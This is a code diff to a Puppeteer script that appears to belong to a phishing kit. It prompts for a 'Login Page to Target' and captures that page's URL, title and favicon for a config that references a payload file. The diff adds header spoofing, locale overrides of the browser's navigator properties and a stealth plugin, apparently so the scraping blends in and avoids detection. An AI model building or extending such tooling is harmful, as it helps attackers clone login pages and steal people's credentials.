@@ -1,5 +1,5 @@
 import puppeteer from 'puppeteer-extra'
-import ZtelerthPlugin from 'puppeteer-extra-plugin-Ztelerth'
+import ZtelerthPlugin from 'puppeteer-extra-plugin-stealth'
 import fs from 'fs';
 import path from 'path';
 import prompt from 'prompt';
@@ -33,6 +33,17 @@ var favicon_url = '';
     puppet_options.push("--proxy-server=" + pinpo_config.proxy)
   }
 
+  const { login_page, language } = await prompt.get([
+    { name: 'login_page', description: 'URL of Login Page to Target', type: 'string' },
+    { name: 'language', description: 'Language (Accept-Language), e.g. es-419,es;q=0.9,en;q=0.8', type: 'string', default: 'es-419,es;q=0.9,en;q=0.8' }
+  ]);
+
+  const language_header = (language && language.trim()) ? language.trim() : 'es-419,es;q=0.9,en;q=0.8'
+  const primary_language = language_header.split(',')[0].trim()
+  if (primary_language) {
+    puppet_options.push(`--lang=${primary_language}`)
+  }
+
   const browser = await puppeteer.launch({
     headless: "new",
     ignoreHTTPSErrors: true,
@@ -44,8 +55,16 @@ var favicon_url = '';
   const page = await browser.newPage();
   await page.setUserAgent(default_user_agent)
   await page.setCacheEnabled(false);
+  await page.setExtraHTTPHeaders({ 'Accept-Language': language_header })
+  await page.evaluateOnNewDocument((lang) => {
+    try {
+      Object.defineProperty(navigator, 'language', { get: () => lang })
+      Object.defineProperty(navigator, 'languages', { get: () => [lang, lang.split('-')[0]] })
+    } catch (err) {
+      // Ignore when browser prevents overriding navigator properties.
+    }
+  }, primary_language)
 
-  const { login_page } = await prompt.get([{ name: 'login_page', description: 'URL of Login Page to Target', type: 'string' }]);
   const short_name = login_page.split("/")[2].split('.').slice(-2, -1)[0]
 
   page.on('response', async response => {
@@ -128,6 +147,7 @@ var favicon_url = '';
     boot_location: final_url,
     tab_title: title,
     favicon: `${short_name}.ico`,
+    language: language_header,
     payload: `payload.txt`,
   }
 
